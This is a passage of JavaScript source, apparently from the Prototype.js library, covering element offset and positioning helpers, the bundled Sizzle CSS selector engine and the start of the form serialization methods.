        element = element.offsetParent;
      } while (element);
    }
    return new Element.Offset(valueL, valueT);
  }

  function positionedOffset(element) {
    element = $(element);

    var layout = element.getLayout();

    var valueT = 0, valueL = 0;
    do {
      valueT += element.offsetTop  || 0;
      valueL += element.offsetLeft || 0;
      element = element.offsetParent;
      if (element) {
        if (isBody(element)) break;
        var p = Element.getStyle(element, 'position');
        if (p !== 'static') break;
      }
    } while (element);

    valueL -= layout.get('margin-top');
    valueT -= layout.get('margin-left');

    return new Element.Offset(valueL, valueT);
  }

  function cumulativeScrollOffset(element) {
    var valueT = 0, valueL = 0;
    do {
      valueT += element.scrollTop  || 0;
      valueL += element.scrollLeft || 0;
      element = element.parentNode;
    } while (element);
    return new Element.Offset(valueL, valueT);
  }

  function viewportOffset(forElement) {
    element = $(element);
    var valueT = 0, valueL = 0, docBody = document.body;

    var element = forElement;
    do {
      valueT += element.offsetTop  || 0;
      valueL += element.offsetLeft || 0;
      if (element.offsetParent == docBody &&
        Element.getStyle(element, 'position') == 'absolute') break;
    } while (element = element.offsetParent);

    element = forElement;
    do {
      if (element != docBody) {
        valueT -= element.scrollTop  || 0;
        valueL -= element.scrollLeft || 0;
      }
    } while (element = element.parentNode);
    return new Element.Offset(valueL, valueT);
  }

  function absolutize(element) {
    element = $(element);

    if (Element.getStyle(element, 'position') === 'absolute') {
      return element;
    }

    var offsetParent = getOffsetParent(element);
    var eOffset = element.viewportOffset(),
     pOffset = offsetParent.viewportOffset();

    var offset = eOffset.relativeTo(pOffset);
    var layout = element.getLayout();

    element.store('prototype_absolutize_original_styles', {
      left:   element.getStyle('left'),
      top:    element.getStyle('top'),
      width:  element.getStyle('width'),
      height: element.getStyle('height')
    });

    element.setStyle({
      position: 'absolute',
      top:    offset.top + 'px',
      left:   offset.left + 'px',
      width:  layout.get('width') + 'px',
      height: layout.get('height') + 'px'
    });

    return element;
  }

  function relativize(element) {
    element = $(element);
    if (Element.getStyle(element, 'position') === 'relative') {
      return element;
    }

    var originalStyles =
     element.retrieve('prototype_absolutize_original_styles');

    if (originalStyles) element.setStyle(originalStyles);
    return element;
  }

  if (Prototype.Browser.IE) {
    getOffsetParent = getOffsetParent.wrap(
      function(proceed, element) {
        element = $(element);

        if (isDocument(element) || isDetached(element) || isBody(element) || isHtml(element))
          return $(document.body);

        var position = element.getStyle('position');
        if (position !== 'static') return proceed(element);

        element.setStyle({ position: 'relative' });
        var value = proceed(element);
        element.setStyle({ position: position });
        return value;
      }
    );

    positionedOffset = positionedOffset.wrap(function(proceed, element) {
      element = $(element);
      if (!element.parentNode) return new Element.Offset(0, 0);
      var position = element.getStyle('position');
      if (position !== 'static') return proceed(element);

      var offsetParent = element.getOffsetParent();
      if (offsetParent && offsetParent.getStyle('position') === 'fixed')
        hasLayout(offsetParent);

      element.setStyle({ position: 'relative' });
      var value = proceed(element);
      element.setStyle({ position: position });
      return value;
    });
  } else if (Prototype.Browser.Webkit) {
    cumulativeOffset = function(element) {
      element = $(element);
      var valueT = 0, valueL = 0;
      do {
        valueT += element.offsetTop  || 0;
        valueL += element.offsetLeft || 0;
        if (element.offsetParent == document.body)
          if (Element.getStyle(element, 'position') == 'absolute') break;

        element = element.offsetParent;
      } while (element);

      return new Element.Offset(valueL, valueT);
    };
  }


  Element.addMethods({
    getLayout:              getLayout,
    measure:                measure,
    getDimensions:          getDimensions,
    getOffsetParent:        getOffsetParent,
    cumulativeOffset:       cumulativeOffset,
    positionedOffset:       positionedOffset,
    cumulativeScrollOffset: cumulativeScrollOffset,
    viewportOffset:         viewportOffset,
    absolutize:             absolutize,
    relativize:             relativize
  });

  function isBody(element) {
    return element.nodeName.toUpperCase() === 'BODY';
  }

  function isHtml(element) {
    return element.nodeName.toUpperCase() === 'HTML';
  }

  function isDocument(element) {
    return element.nodeType === Node.DOCUMENT_NODE;
  }

  function isDetached(element) {
    return element !== document.body &&
     !Element.descendantOf(element, document.body);
  }

  if ('getBoundingClientRect' in document.documentElement) {
    Element.addMethods({
      viewportOffset: function(element) {
        element = $(element);
        if (isDetached(element)) return new Element.Offset(0, 0);

        var rect = element.getBoundingClientRect(),
         docEl = document.documentElement;
        return new Element.Offset(rect.left - docEl.clientLeft,
         rect.top - docEl.clientTop);
      }
    });
  }
})();
window.$$ = function() {
  var expression = $A(arguments).join(', ');
  return Prototype.Selector.select(expression, document);
};

Prototype.Selector = (function() {

  function select() {
    throw new Error('Method "Prototype.Selector.select" must be defined.');
  }

  function match() {
    throw new Error('Method "Prototype.Selector.match" must be defined.');
  }

  function find(elements, expression, index) {
    index = index || 0;
    var match = Prototype.Selector.match, length = elements.length, matchIndex = 0, i;

    for (i = 0; i < length; i++) {
      if (match(elements[i], expression) && index == matchIndex++) {
        return Element.extend(elements[i]);
      }
    }
  }

  function extendElements(elements) {
    for (var i = 0, length = elements.length; i < length; i++) {
      Element.extend(elements[i]);
    }
    return elements;
  }


  var K = Prototype.K;

  return {
    select: select,
    match: match,
    find: find,
    extendElements: (Element.extend === K) ? K : extendElements,
    extendElement: Element.extend
  };
})();
Prototype._original_property = window.Sizzle;
/*!
 * Sizzle CSS Selector Engine - v1.0
 *  Copyright 2009, The Dojo Foundation
 *  Released under the MIT, BSD, and GPL Licenses.
 *  More information: http://sizzlejs.com/
 */
(function(){

var chunker = /((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^[\]]*\]|['"][^'"]*['"]|[^[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,
	done = 0,
	toString = Object.prototype.toString,
	hasDuplicate = false,
	baseHasDuplicate = true;

[0, 0].sort(function(){
	baseHasDuplicate = false;
	return 0;
});

var Sizzle = function(selector, context, results, seed) {
	results = results || [];
	var origContext = context = context || document;

	if ( context.nodeType !== 1 && context.nodeType !== 9 ) {
		return [];
	}

	if ( !selector || typeof selector !== "string" ) {
		return results;
	}

	var parts = [], m, set, checkSet, check, mode, extra, prune = true, contextXML = isXML(context),
		soFar = selector;

	while ( (chunker.exec(""), m = chunker.exec(soFar)) !== null ) {
		soFar = m[3];

		parts.push( m[1] );

		if ( m[2] ) {
			extra = m[3];
			break;
		}
	}

	if ( parts.length > 1 && origPOS.exec( selector ) ) {
		if ( parts.length === 2 && Expr.relative[ parts[0] ] ) {
			set = posProcess( parts[0] + parts[1], context );
		} else {
			set = Expr.relative[ parts[0] ] ?
				[ context ] :
				Sizzle( parts.shift(), context );

			while ( parts.length ) {
				selector = parts.shift();

				if ( Expr.relative[ selector ] )
					selector += parts.shift();

				set = posProcess( selector, set );
			}
		}
	} else {
		if ( !seed && parts.length > 1 && context.nodeType === 9 && !contextXML &&
				Expr.match.ID.test(parts[0]) && !Expr.match.ID.test(parts[parts.length - 1]) ) {
			var ret = Sizzle.find( parts.shift(), context, contextXML );
			context = ret.expr ? Sizzle.filter( ret.expr, ret.set )[0] : ret.set[0];
		}

		if ( context ) {
			var ret = seed ?
				{ expr: parts.pop(), set: makeArray(seed) } :
				Sizzle.find( parts.pop(), parts.length === 1 && (parts[0] === "~" || parts[0] === "+") && context.parentNode ? context.parentNode : context, contextXML );
			set = ret.expr ? Sizzle.filter( ret.expr, ret.set ) : ret.set;

			if ( parts.length > 0 ) {
				checkSet = makeArray(set);
			} else {
				prune = false;
			}

			while ( parts.length ) {
				var cur = parts.pop(), pop = cur;

				if ( !Expr.relative[ cur ] ) {
					cur = "";
				} else {
					pop = parts.pop();
				}

				if ( pop == null ) {
					pop = context;
				}

				Expr.relative[ cur ]( checkSet, pop, contextXML );
			}
		} else {
			checkSet = parts = [];
		}
	}

	if ( !checkSet ) {
		checkSet = set;
	}

	if ( !checkSet ) {
		throw "Syntax error, unrecognized expression: " + (cur || selector);
	}

	if ( toString.call(checkSet) === "[object Array]" ) {
		if ( !prune ) {
			results.push.apply( results, checkSet );
		} else if ( context && context.nodeType === 1 ) {
			for ( var i = 0; checkSet[i] != null; i++ ) {
				if ( checkSet[i] && (checkSet[i] === true || checkSet[i].nodeType === 1 && contains(context, checkSet[i])) ) {
					results.push( set[i] );
				}
			}
		} else {
			for ( var i = 0; checkSet[i] != null; i++ ) {
				if ( checkSet[i] && checkSet[i].nodeType === 1 ) {
					results.push( set[i] );
				}
			}
		}
	} else {
		makeArray( checkSet, results );
	}

	if ( extra ) {
		Sizzle( extra, origContext, results, seed );
		Sizzle.uniqueSort( results );
	}

	return results;
};

Sizzle.uniqueSort = function(results){
	if ( sortOrder ) {
		hasDuplicate = baseHasDuplicate;
		results.sort(sortOrder);

		if ( hasDuplicate ) {
			for ( var i = 1; i < results.length; i++ ) {
				if ( results[i] === results[i-1] ) {
					results.splice(i--, 1);
				}
			}
		}
	}

	return results;
};

Sizzle.matches = function(expr, set){
	return Sizzle(expr, null, null, set);
};

Sizzle.find = function(expr, context, isXML){
	var set, match;

	if ( !expr ) {
		return [];
	}

	for ( var i = 0, l = Expr.order.length; i < l; i++ ) {
		var type = Expr.order[i], match;

		if ( (match = Expr.leftMatch[ type ].exec( expr )) ) {
			var left = match[1];
			match.splice(1,1);

			if ( left.substr( left.length - 1 ) !== "\\" ) {
				match[1] = (match[1] || "").replace(/\\/g, "");
				set = Expr.find[ type ]( match, context, isXML );
				if ( set != null ) {
					expr = expr.replace( Expr.match[ type ], "" );
					break;
				}
			}
		}
	}

	if ( !set ) {
		set = context.getElementsByTagName("*");
	}

	return {set: set, expr: expr};
};

Sizzle.filter = function(expr, set, inplace, not){
	var old = expr, result = [], curLoop = set, match, anyFound,
		isXMLFilter = set && set[0] && isXML(set[0]);

	while ( expr && set.length ) {
		for ( var type in Expr.filter ) {
			if ( (match = Expr.match[ type ].exec( expr )) != null ) {
				var filter = Expr.filter[ type ], found, item;
				anyFound = false;

				if ( curLoop == result ) {
					result = [];
				}

				if ( Expr.preFilter[ type ] ) {
					match = Expr.preFilter[ type ]( match, curLoop, inplace, result, not, isXMLFilter );

					if ( !match ) {
						anyFound = found = true;
					} else if ( match === true ) {
						continue;
					}
				}

				if ( match ) {
					for ( var i = 0; (item = curLoop[i]) != null; i++ ) {
						if ( item ) {
							found = filter( item, match, i, curLoop );
							var pass = not ^ !!found;

							if ( inplace && found != null ) {
								if ( pass ) {
									anyFound = true;
								} else {
									curLoop[i] = false;
								}
							} else if ( pass ) {
								result.push( item );
								anyFound = true;
							}
						}
					}
				}

				if ( found !== undefined ) {
					if ( !inplace ) {
						curLoop = result;
					}

					expr = expr.replace( Expr.match[ type ], "" );

					if ( !anyFound ) {
						return [];
					}

					break;
				}
			}
		}

		if ( expr == old ) {
			if ( anyFound == null ) {
				throw "Syntax error, unrecognized expression: " + expr;
			} else {
				break;
			}
		}

		old = expr;
	}

	return curLoop;
};

var Expr = Sizzle.selectors = {
	order: [ "ID", "NAME", "TAG" ],
	match: {
		ID: /#((?:[\w\u00c0-\uFFFF-]|\\.)+)/,
		CLASS: /\.((?:[\w\u00c0-\uFFFF-]|\\.)+)/,
		NAME: /\[name=['"]*((?:[\w\u00c0-\uFFFF-]|\\.)+)['"]*\]/,
		ATTR: /\[\s*((?:[\w\u00c0-\uFFFF-]|\\.)+)\s*(?:(\S?=)\s*(['"]*)(.*?)\3|)\s*\]/,
		TAG: /^((?:[\w\u00c0-\uFFFF\*-]|\\.)+)/,
		CHILD: /:(only|nth|last|first)-child(?:\((even|odd|[\dn+-]*)\))?/,
		POS: /:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^-]|$)/,
		PSEUDO: /:((?:[\w\u00c0-\uFFFF-]|\\.)+)(?:\((['"]*)((?:\([^\)]+\)|[^\2\(\)]*)+)\2\))?/
	},
	leftMatch: {},
	attrMap: {
		"class": "className",
		"for": "htmlFor"
	},
	attrHandle: {
		href: function(elem){
			return elem.getAttribute("href");
		}
	},
	relative: {
		"+": function(checkSet, part, isXML){
			var isPartStr = typeof part === "string",
				isTag = isPartStr && !/\W/.test(part),
				isPartStrNotTag = isPartStr && !isTag;

			if ( isTag && !isXML ) {
				part = part.toUpperCase();
			}

			for ( var i = 0, l = checkSet.length, elem; i < l; i++ ) {
				if ( (elem = checkSet[i]) ) {
					while ( (elem = elem.previousSibling) && elem.nodeType !== 1 ) {}

					checkSet[i] = isPartStrNotTag || elem && elem.nodeName === part ?
						elem || false :
						elem === part;
				}
			}

			if ( isPartStrNotTag ) {
				Sizzle.filter( part, checkSet, true );
			}
		},
		">": function(checkSet, part, isXML){
			var isPartStr = typeof part === "string";

			if ( isPartStr && !/\W/.test(part) ) {
				part = isXML ? part : part.toUpperCase();

				for ( var i = 0, l = checkSet.length; i < l; i++ ) {
					var elem = checkSet[i];
					if ( elem ) {
						var parent = elem.parentNode;
						checkSet[i] = parent.nodeName === part ? parent : false;
					}
				}
			} else {
				for ( var i = 0, l = checkSet.length; i < l; i++ ) {
					var elem = checkSet[i];
					if ( elem ) {
						checkSet[i] = isPartStr ?
							elem.parentNode :
							elem.parentNode === part;
					}
				}

				if ( isPartStr ) {
					Sizzle.filter( part, checkSet, true );
				}
			}
		},
		"": function(checkSet, part, isXML){
			var doneName = done++, checkFn = dirCheck;

			if ( !/\W/.test(part) ) {
				var nodeCheck = part = isXML ? part : part.toUpperCase();
				checkFn = dirNodeCheck;
			}

			checkFn("parentNode", part, doneName, checkSet, nodeCheck, isXML);
		},
		"~": function(checkSet, part, isXML){
			var doneName = done++, checkFn = dirCheck;

			if ( typeof part === "string" && !/\W/.test(part) ) {
				var nodeCheck = part = isXML ? part : part.toUpperCase();
				checkFn = dirNodeCheck;
			}

			checkFn("previousSibling", part, doneName, checkSet, nodeCheck, isXML);
		}
	},
	find: {
		ID: function(match, context, isXML){
			if ( typeof context.getElementById !== "undefined" && !isXML ) {
				var m = context.getElementById(match[1]);
				return m ? [m] : [];
			}
		},
		NAME: function(match, context, isXML){
			if ( typeof context.getElementsByName !== "undefined" ) {
				var ret = [], results = context.getElementsByName(match[1]);

				for ( var i = 0, l = results.length; i < l; i++ ) {
					if ( results[i].getAttribute("name") === match[1] ) {
						ret.push( results[i] );
					}
				}

				return ret.length === 0 ? null : ret;
			}
		},
		TAG: function(match, context){
			return context.getElementsByTagName(match[1]);
		}
	},
	preFilter: {
		CLASS: function(match, curLoop, inplace, result, not, isXML){
			match = " " + match[1].replace(/\\/g, "") + " ";

			if ( isXML ) {
				return match;
			}

			for ( var i = 0, elem; (elem = curLoop[i]) != null; i++ ) {
				if ( elem ) {
					if ( not ^ (elem.className && (" " + elem.className + " ").indexOf(match) >= 0) ) {
						if ( !inplace )
							result.push( elem );
					} else if ( inplace ) {
						curLoop[i] = false;
					}
				}
			}

			return false;
		},
		ID: function(match){
			return match[1].replace(/\\/g, "");
		},
		TAG: function(match, curLoop){
			for ( var i = 0; curLoop[i] === false; i++ ){}
			return curLoop[i] && isXML(curLoop[i]) ? match[1] : match[1].toUpperCase();
		},
		CHILD: function(match){
			if ( match[1] == "nth" ) {
				var test = /(-?)(\d*)n((?:\+|-)?\d*)/.exec(
					match[2] == "even" && "2n" || match[2] == "odd" && "2n+1" ||
					!/\D/.test( match[2] ) && "0n+" + match[2] || match[2]);

				match[2] = (test[1] + (test[2] || 1)) - 0;
				match[3] = test[3] - 0;
			}

			match[0] = done++;

			return match;
		},
		ATTR: function(match, curLoop, inplace, result, not, isXML){
			var name = match[1].replace(/\\/g, "");

			if ( !isXML && Expr.attrMap[name] ) {
				match[1] = Expr.attrMap[name];
			}

			if ( match[2] === "~=" ) {
				match[4] = " " + match[4] + " ";
			}

			return match;
		},
		PSEUDO: function(match, curLoop, inplace, result, not){
			if ( match[1] === "not" ) {
				if ( ( chunker.exec(match[3]) || "" ).length > 1 || /^\w/.test(match[3]) ) {
					match[3] = Sizzle(match[3], null, null, curLoop);
				} else {
					var ret = Sizzle.filter(match[3], curLoop, inplace, true ^ not);
					if ( !inplace ) {
						result.push.apply( result, ret );
					}
					return false;
				}
			} else if ( Expr.match.POS.test( match[0] ) || Expr.match.CHILD.test( match[0] ) ) {
				return true;
			}

			return match;
		},
		POS: function(match){
			match.unshift( true );
			return match;
		}
	},
	filters: {
		enabled: function(elem){
			return elem.disabled === false && elem.type !== "hidden";
		},
		disabled: function(elem){
			return elem.disabled === true;
		},
		checked: function(elem){
			return elem.checked === true;
		},
		selected: function(elem){
			elem.parentNode.selectedIndex;
			return elem.selected === true;
		},
		parent: function(elem){
			return !!elem.firstChild;
		},
		empty: function(elem){
			return !elem.firstChild;
		},
		has: function(elem, i, match){
			return !!Sizzle( match[3], elem ).length;
		},
		header: function(elem){
			return /h\d/i.test( elem.nodeName );
		},
		text: function(elem){
			return "text" === elem.type;
		},
		radio: function(elem){
			return "radio" === elem.type;
		},
		checkbox: function(elem){
			return "checkbox" === elem.type;
		},
		file: function(elem){
			return "file" === elem.type;
		},
		password: function(elem){
			return "password" === elem.type;
		},
		submit: function(elem){
			return "submit" === elem.type;
		},
		image: function(elem){
			return "image" === elem.type;
		},
		reset: function(elem){
			return "reset" === elem.type;
		},
		button: function(elem){
			return "button" === elem.type || elem.nodeName.toUpperCase() === "BUTTON";
		},
		input: function(elem){
			return /input|select|textarea|button/i.test(elem.nodeName);
		}
	},
	setFilters: {
		first: function(elem, i){
			return i === 0;
		},
		last: function(elem, i, match, array){
			return i === array.length - 1;
		},
		even: function(elem, i){
			return i % 2 === 0;
		},
		odd: function(elem, i){
			return i % 2 === 1;
		},
		lt: function(elem, i, match){
			return i < match[3] - 0;
		},
		gt: function(elem, i, match){
			return i > match[3] - 0;
		},
		nth: function(elem, i, match){
			return match[3] - 0 == i;
		},
		eq: function(elem, i, match){
			return match[3] - 0 == i;
		}
	},
	filter: {
		PSEUDO: function(elem, match, i, array){
			var name = match[1], filter = Expr.filters[ name ];

			if ( filter ) {
				return filter( elem, i, match, array );
			} else if ( name === "contains" ) {
				return (elem.textContent || elem.innerText || "").indexOf(match[3]) >= 0;
			} else if ( name === "not" ) {
				var not = match[3];

				for ( var i = 0, l = not.length; i < l; i++ ) {
					if ( not[i] === elem ) {
						return false;
					}
				}

				return true;
			}
		},
		CHILD: function(elem, match){
			var type = match[1], node = elem;
			switch (type) {
				case 'only':
				case 'first':
					while ( (node = node.previousSibling) )  {
						if ( node.nodeType === 1 ) return false;
					}
					if ( type == 'first') return true;
					node = elem;
				case 'last':
					while ( (node = node.nextSibling) )  {
						if ( node.nodeType === 1 ) return false;
					}
					return true;
				case 'nth':
					var first = match[2], last = match[3];

					if ( first == 1 && last == 0 ) {
						return true;
					}

					var doneName = match[0],
						parent = elem.parentNode;

					if ( parent && (parent.sizcache !== doneName || !elem.nodeIndex) ) {
						var count = 0;
						for ( node = parent.firstChild; node; node = node.nextSibling ) {
							if ( node.nodeType === 1 ) {
								node.nodeIndex = ++count;
							}
						}
						parent.sizcache = doneName;
					}

					var diff = elem.nodeIndex - last;
					if ( first == 0 ) {
						return diff == 0;
					} else {
						return ( diff % first == 0 && diff / first >= 0 );
					}
			}
		},
		ID: function(elem, match){
			return elem.nodeType === 1 && elem.getAttribute("id") === match;
		},
		TAG: function(elem, match){
			return (match === "*" && elem.nodeType === 1) || elem.nodeName === match;
		},
		CLASS: function(elem, match){
			return (" " + (elem.className || elem.getAttribute("class")) + " ")
				.indexOf( match ) > -1;
		},
		ATTR: function(elem, match){
			var name = match[1],
				result = Expr.attrHandle[ name ] ?
					Expr.attrHandle[ name ]( elem ) :
					elem[ name ] != null ?
						elem[ name ] :
						elem.getAttribute( name ),
				value = result + "",
				type = match[2],
				check = match[4];

			return result == null ?
				type === "!=" :
				type === "=" ?
				value === check :
				type === "*=" ?
				value.indexOf(check) >= 0 :
				type === "~=" ?
				(" " + value + " ").indexOf(check) >= 0 :
				!check ?
				value && result !== false :
				type === "!=" ?
				value != check :
				type === "^=" ?
				value.indexOf(check) === 0 :
				type === "$=" ?
				value.substr(value.length - check.length) === check :
				type === "|=" ?
				value === check || value.substr(0, check.length + 1) === check + "-" :
				false;
		},
		POS: function(elem, match, i, array){
			var name = match[2], filter = Expr.setFilters[ name ];

			if ( filter ) {
				return filter( elem, i, match, array );
			}
		}
	}
};

var origPOS = Expr.match.POS;

for ( var type in Expr.match ) {
	Expr.match[ type ] = new RegExp( Expr.match[ type ].source + /(?![^\[]*\])(?![^\(]*\))/.source );
	Expr.leftMatch[ type ] = new RegExp( /(^(?:.|\r|\n)*?)/.source + Expr.match[ type ].source );
}

var makeArray = function(array, results) {
	array = Array.prototype.slice.call( array, 0 );

	if ( results ) {
		results.push.apply( results, array );
		return results;
	}

	return array;
};

try {
	Array.prototype.slice.call( document.documentElement.childNodes, 0 );

} catch(e){
	makeArray = function(array, results) {
		var ret = results || [];

		if ( toString.call(array) === "[object Array]" ) {
			Array.prototype.push.apply( ret, array );
		} else {
			if ( typeof array.length === "number" ) {
				for ( var i = 0, l = array.length; i < l; i++ ) {
					ret.push( array[i] );
				}
			} else {
				for ( var i = 0; array[i]; i++ ) {
					ret.push( array[i] );
				}
			}
		}

		return ret;
	};
}

var sortOrder;

if ( document.documentElement.compareDocumentPosition ) {
	sortOrder = function( a, b ) {
		if ( !a.compareDocumentPosition || !b.compareDocumentPosition ) {
			if ( a == b ) {
				hasDuplicate = true;
			}
			return 0;
		}

		var ret = a.compareDocumentPosition(b) & 4 ? -1 : a === b ? 0 : 1;
		if ( ret === 0 ) {
			hasDuplicate = true;
		}
		return ret;
	};
} else if ( "sourceIndex" in document.documentElement ) {
	sortOrder = function( a, b ) {
		if ( !a.sourceIndex || !b.sourceIndex ) {
			if ( a == b ) {
				hasDuplicate = true;
			}
			return 0;
		}

		var ret = a.sourceIndex - b.sourceIndex;
		if ( ret === 0 ) {
			hasDuplicate = true;
		}
		return ret;
	};
} else if ( document.createRange ) {
	sortOrder = function( a, b ) {
		if ( !a.ownerDocument || !b.ownerDocument ) {
			if ( a == b ) {
				hasDuplicate = true;
			}
			return 0;
		}

		var aRange = a.ownerDocument.createRange(), bRange = b.ownerDocument.createRange();
		aRange.setStart(a, 0);
		aRange.setEnd(a, 0);
		bRange.setStart(b, 0);
		bRange.setEnd(b, 0);
		var ret = aRange.compareBoundaryPoints(Range.START_TO_END, bRange);
		if ( ret === 0 ) {
			hasDuplicate = true;
		}
		return ret;
	};
}

(function(){
	var form = document.createElement("div"),
		id = "script" + (new Date).getTime();
	form.innerHTML = "<a name='" + id + "'/>";

	var root = document.documentElement;
	root.insertBefore( form, root.firstChild );

	if ( !!document.getElementById( id ) ) {
		Expr.find.ID = function(match, context, isXML){
			if ( typeof context.getElementById !== "undefined" && !isXML ) {
				var m = context.getElementById(match[1]);
				return m ? m.id === match[1] || typeof m.getAttributeNode !== "undefined" && m.getAttributeNode("id").nodeValue === match[1] ? [m] : undefined : [];
			}
		};

		Expr.filter.ID = function(elem, match){
			var node = typeof elem.getAttributeNode !== "undefined" && elem.getAttributeNode("id");
			return elem.nodeType === 1 && node && node.nodeValue === match;
		};
	}

	root.removeChild( form );
	root = form = null; // release memory in IE
})();

(function(){

	var div = document.createElement("div");
	div.appendChild( document.createComment("") );

	if ( div.getElementsByTagName("*").length > 0 ) {
		Expr.find.TAG = function(match, context){
			var results = context.getElementsByTagName(match[1]);

			if ( match[1] === "*" ) {
				var tmp = [];

				for ( var i = 0; results[i]; i++ ) {
					if ( results[i].nodeType === 1 ) {
						tmp.push( results[i] );
					}
				}

				results = tmp;
			}

			return results;
		};
	}

	div.innerHTML = "<a href='#'></a>";
	if ( div.firstChild && typeof div.firstChild.getAttribute !== "undefined" &&
			div.firstChild.getAttribute("href") !== "#" ) {
		Expr.attrHandle.href = function(elem){
			return elem.getAttribute("href", 2);
		};
	}

	div = null; // release memory in IE
})();

if ( document.querySelectorAll ) (function(){
	var oldSizzle = Sizzle, div = document.createElement("div");
	div.innerHTML = "<p class='TEST'></p>";

	if ( div.querySelectorAll && div.querySelectorAll(".TEST").length === 0 ) {
		return;
	}

	Sizzle = function(query, context, extra, seed){
		context = context || document;

		if ( !seed && context.nodeType === 9 && !isXML(context) ) {
			try {
				return makeArray( context.querySelectorAll(query), extra );
			} catch(e){}
		}

		return oldSizzle(query, context, extra, seed);
	};

	for ( var prop in oldSizzle ) {
		Sizzle[ prop ] = oldSizzle[ prop ];
	}

	div = null; // release memory in IE
})();

if ( document.getElementsByClassName && document.documentElement.getElementsByClassName ) (function(){
	var div = document.createElement("div");
	div.innerHTML = "<div class='test e'></div><div class='test'></div>";

	if ( div.getElementsByClassName("e").length === 0 )
		return;

	div.lastChild.className = "e";

	if ( div.getElementsByClassName("e").length === 1 )
		return;

	Expr.order.splice(1, 0, "CLASS");
	Expr.find.CLASS = function(match, context, isXML) {
		if ( typeof context.getElementsByClassName !== "undefined" && !isXML ) {
			return context.getElementsByClassName(match[1]);
		}
	};

	div = null; // release memory in IE
})();

function dirNodeCheck( dir, cur, doneName, checkSet, nodeCheck, isXML ) {
	var sibDir = dir == "previousSibling" && !isXML;
	for ( var i = 0, l = checkSet.length; i < l; i++ ) {
		var elem = checkSet[i];
		if ( elem ) {
			if ( sibDir && elem.nodeType === 1 ){
				elem.sizcache = doneName;
				elem.sizset = i;
			}
			elem = elem[dir];
			var match = false;

			while ( elem ) {
				if ( elem.sizcache === doneName ) {
					match = checkSet[elem.sizset];
					break;
				}

				if ( elem.nodeType === 1 && !isXML ){
					elem.sizcache = doneName;
					elem.sizset = i;
				}

				if ( elem.nodeName === cur ) {
					match = elem;
					break;
				}

				elem = elem[dir];
			}

			checkSet[i] = match;
		}
	}
}

function dirCheck( dir, cur, doneName, checkSet, nodeCheck, isXML ) {
	var sibDir = dir == "previousSibling" && !isXML;
	for ( var i = 0, l = checkSet.length; i < l; i++ ) {
		var elem = checkSet[i];
		if ( elem ) {
			if ( sibDir && elem.nodeType === 1 ) {
				elem.sizcache = doneName;
				elem.sizset = i;
			}
			elem = elem[dir];
			var match = false;

			while ( elem ) {
				if ( elem.sizcache === doneName ) {
					match = checkSet[elem.sizset];
					break;
				}

				if ( elem.nodeType === 1 ) {
					if ( !isXML ) {
						elem.sizcache = doneName;
						elem.sizset = i;
					}
					if ( typeof cur !== "string" ) {
						if ( elem === cur ) {
							match = true;
							break;
						}

					} else if ( Sizzle.filter( cur, [elem] ).length > 0 ) {
						match = elem;
						break;
					}
				}

				elem = elem[dir];
			}

			checkSet[i] = match;
		}
	}
}

var contains = document.compareDocumentPosition ?  function(a, b){
	return a.compareDocumentPosition(b) & 16;
} : function(a, b){
	return a !== b && (a.contains ? a.contains(b) : true);
};

var isXML = function(elem){
	return elem.nodeType === 9 && elem.documentElement.nodeName !== "HTML" ||
		!!elem.ownerDocument && elem.ownerDocument.documentElement.nodeName !== "HTML";
};

var posProcess = function(selector, context){
	var tmpSet = [], later = "", match,
		root = context.nodeType ? [context] : context;

	while ( (match = Expr.match.PSEUDO.exec( selector )) ) {
		later += match[0];
		selector = selector.replace( Expr.match.PSEUDO, "" );
	}

	selector = Expr.relative[selector] ? selector + "*" : selector;

	for ( var i = 0, l = root.length; i < l; i++ ) {
		Sizzle( selector, root[i], tmpSet );
	}

	return Sizzle.filter( later, tmpSet );
};


window.Sizzle = Sizzle;

})();

;(function(engine) {
  var extendElements = Prototype.Selector.extendElements;

  function select(selector, scope) {
    return extendElements(engine(selector, scope || document));
  }

  function match(element, selector) {
    return engine.matches(selector, [element]).length == 1;
  }

  Prototype.Selector.engine = engine;
  Prototype.Selector.select = select;
  Prototype.Selector.match = match;
})(Sizzle);

window.Sizzle = Prototype._original_property;
delete Prototype._original_property;

var Form = {
  reset: function(form) {
    form = $(form);
    form.reset();
    return form;
  },

  serializeElements: function(elements, options) {
    if (typeof options != 'object') options = { hash: !!options };
    else if (Object.isUndefined(options.hash)) options.hash = true;
    var key, value, submitted = false, submit = options.submit, accumulator, initial;

    if (options.hash) {
      initial = {};
      accumulator = function(result, key, value) {
        if (key in result) {
          if (!Object.isArray(result[key])) result[key] = [result[key]];
          result[key].push(value);
        } else result[key] = value;
        return result;
      };
    } else {
      initial = '';
      accumulator = function(result, key, value) {
        return result + (result ? '&' : '') + encodeURIComponent(key) + '=' + encodeURIComponent(value);
      }
    }

    return elements.inject(initial, function(result, element) {
      if (!element.disabled && element.name) {
        key = element.name; value = $(element).getValue();
        if (value != null && element.type != 'file' && (element.type != 'submit' || (!submitted &&
            submit !== false && (!submit || key == submit) && (submitted = true)))) {
          result = accumulator(result, key, value);
        }
      }
      return result;
    });
  }
};

Form.Methods = {
  serialize: function(form, options) {
    return Form.serializeElements(Form.getElements(form), options);
  },

  getElements: function(form) {
    var elements = $(form).getElementsByTagName('*'),
        element,
        arr = [ ],
        serializers = Form.Element.Serializers;
    for (var i = 0; element = elements[i]; i++) {
      arr.push(element);
    }
    return arr.inject([], function(elements, child) {
      if (serializers[child.tagName.toLowerCase()])
        elements.push(Element.extend(child));
      return elements;
    })
  },

  getInputs: function(form, typeName, name) {
    form = $(form);
    var inputs = form.getElementsByTagName('input');

    if (!typeName && !name) return $A(inputs).map(Element.extend);

    for (var i = 0, matchingInputs = [], length = inputs.length; i < length; i++) {
      var input = inputs[i];
      if ((typeName && input.type != typeName) || (name && input.name != name))
        continue;
      matchingInputs.push(Element.extend(input));
    }

    return matchingInputs;
  },

  disable: function(form) {
    form = $(form);
    Form.getElements(form).invoke('disable');
    return form;
  },

  enable: function(form) {
    form = $(form);
    Form.getElements(form).invoke('enable');
    return form;
  },

  findFirstElement: function(form) {
    var elements = $(form).getElements().findAll(function(element) {
      return 'hidden' != element.type && !element.disabled;
    });
    var firstByIndex = elements.findAll(function(element) {
      return element.hasAttribute('tabIndex') && element.tabIndex >= 0;
    }).sortBy(function(element) { return element.tabIndex }).first();

    return firstByIndex ? firstByIndex : elements.find(function(element) {
